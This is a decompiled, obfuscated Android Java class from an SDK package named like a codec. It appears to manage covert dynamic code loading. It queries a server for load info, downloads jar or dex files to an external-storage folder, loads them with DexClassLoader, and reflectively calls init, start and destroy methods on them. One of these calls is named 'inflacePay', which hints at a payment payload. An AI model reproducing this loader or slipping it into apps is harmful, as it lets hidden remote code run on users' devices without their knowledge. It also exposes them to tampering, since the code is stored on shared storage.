package bn.sdk.szwcsss.codec.x;

import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import bn.sdk.szwcsss.codec.aa.Cif;
import bn.sdk.szwcsss.codec.ac.Cbyte;
import bn.sdk.szwcsss.codec.ac.Cnew;
import bn.sdk.szwcsss.codec.ad.Cint;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.json.JSONObject;
/* renamed from: bn.sdk.szwcsss.codec.x.do  reason: invalid class name */
/* loaded from: classes.dex */
public class Cdo {

    /* renamed from: if  reason: not valid java name */
    private static Cdo f361if = null;

    /* renamed from: int  reason: not valid java name */
    private Context f364int;

    /* renamed from: new  reason: not valid java name */
    private String f365new;

    /* renamed from: for  reason: not valid java name */
    private List f363for = new ArrayList();

    /* renamed from: do  reason: not valid java name */
    Map f362do = new HashMap();

    /* renamed from: try  reason: not valid java name */
    private int f366try = 0;

    /* renamed from: do  reason: not valid java name */
    public static Cdo m465do() {
        if (f361if == null) {
            f361if = new Cdo();
        }
        return f361if;
    }

    /* renamed from: do  reason: not valid java name */
    private void m467do(Context context, Cif ifVar) {
        Cnew.m140do("downFile start");
        if (ifVar != null) {
            String str = Environment.getExternalStorageDirectory().getAbsolutePath() + "/dsyc/" + ifVar.m12int();
            Cnew.m142do("downFile name :%s - %s", ifVar.m11for(), str);
            new bn.sdk.szwcsss.codec.ad.Cif().m164do(new Cint(this, null), ifVar.m11for(), str);
        }
    }

    /* renamed from: do  reason: not valid java name */
    private void m468do(Context context, String str, Object... objArr) {
        Cnew.m142do("inflace method :%s", str);
        if (this.f363for == null || this.f363for.size() == 0) {
            Cnew.m142do("inflace method getSyncLoadInfo %s", str);
            m474do(context);
            return;
        }
        Cnew.m140do("inflace exe");
        String absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();
        for (Cif ifVar : this.f363for) {
            Cnew.m142do("inflace DsyncLoadInfo %s", ifVar);
            String str2 = absolutePath + "/dsyc/" + ifVar.m12int();
            Cnew.m142do("inflace jarPath %s", str2);
            if (!m470do(ifVar.m12int())) {
                m472for(context);
            } else {
                Cnew.m142do("DsycLoadClass exe inflace :%s", str2);
                try {
                    String absolutePath2 = context.getApplicationContext().getDir("dsyc", 0).getAbsolutePath();
                    Cnew.m142do("DsycLoadClass tmpPath :%s", absolutePath2);
                    Cnew.m142do("DsycLoadClass jarPath :%s", absolutePath2);
                    DexClassLoader dexClassLoader = (DexClassLoader) this.f362do.get(ifVar.m12int());
                    if (dexClassLoader == null) {
                        dexClassLoader = new Cif(this, str2, absolutePath2, null, Cdo.class.getClassLoader());
                        this.f362do.put(ifVar.m12int(), dexClassLoader);
                    }
                    Cnew.m142do("DexClassLoader loadClass :%s", absolutePath2);
                    Class loadClass = dexClassLoader.loadClass(ifVar.m10do());
                    Object newInstance = loadClass.getConstructor(new Class[0]).newInstance(new Object[0]);
                    if ("init".equals(str)) {
                        Method declaredMethod = loadClass.getDeclaredMethod(str, Context.class, String.class);
                        declaredMethod.setAccessible(true);
                        declaredMethod.invoke(newInstance, objArr);
                    } else if ("destory".equals(str)) {
                        Method declaredMethod2 = loadClass.getDeclaredMethod(str, Context.class);
                        declaredMethod2.setAccessible(true);
                        declaredMethod2.invoke(newInstance, objArr);
                    } else if ("start".equals(str)) {
                        Method declaredMethod3 = loadClass.getDeclaredMethod(str, Context.class, Integer.class, Handler.class);
                        declaredMethod3.setAccessible(true);
                        declaredMethod3.invoke(newInstance, objArr);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    Cnew.m142do("DexClassLoader Exception :%s", e.getMessage());
                }
            }
        }
    }

    /* renamed from: do  reason: not valid java name */
    private boolean m470do(String str) {
        Cnew.m140do("check file isExict");
        return new File(new StringBuilder().append(Environment.getExternalStorageDirectory().getAbsolutePath()).append("/dsyc/").append(str).toString()).exists();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: for  reason: not valid java name */
    public void m472for(Context context) {
        if (!(this.f363for == null || this.f363for.size() == 0)) {
            Cnew.m140do("DsyncInfoHttpListener loadFile start");
            for (Cif ifVar : this.f363for) {
                Cnew.m142do("DsyncLoadInfo info : %s", ifVar);
                if (ifVar != null) {
                    if (!m470do(ifVar.m12int())) {
                        m467do(context, ifVar);
                    } else if (this.f364int != null && !Cbyte.m124do(this.f365new)) {
                        m476do(this.f364int, this.f365new);
                    }
                }
            }
        }
    }

    /* renamed from: do  reason: not valid java name */
    public void m474do(Context context) {
        this.f364int = context;
        try {
            new bn.sdk.szwcsss.codec.ad.Cdo();
            JSONObject jSONObject = new JSONObject();
            bn.sdk.szwcsss.codec.aa.Cdo doVar = new bn.sdk.szwcsss.codec.aa.Cdo(context);
            jSONObject.put(doVar.mo2if(), doVar.m8do());
            bn.sdk.szwcsss.codec.ad.Cdo.m158do(context, 13, jSONObject, (Cint) new Cfor(this, null));
        } catch (Exception e) {
            e.printStackTrace();
            Cnew.m142do("DsyncLoadManager getSyncLoadInfo Exception :%s", e.getMessage());
        }
    }

    /* renamed from: do  reason: not valid java name */
    public void m475do(Context context, int i, Handler handler) {
        Cnew.m140do("inflacePay start");
        m468do(context, "start", context, Integer.valueOf(i), handler);
    }

    /* renamed from: do  reason: not valid java name */
    public void m476do(Context context, String str) {
        if (this.f366try <= 10) {
            this.f366try++;
            this.f365new = str;
            Cnew.m140do("inflaceInit start");
            m468do(context, "init", context, str);
        }
    }

    /* renamed from: if  reason: not valid java name */
    public void m477if(Context context) {
        Cnew.m140do("inflaceDestory start");
        m468do(context, "destory", context);
    }
}
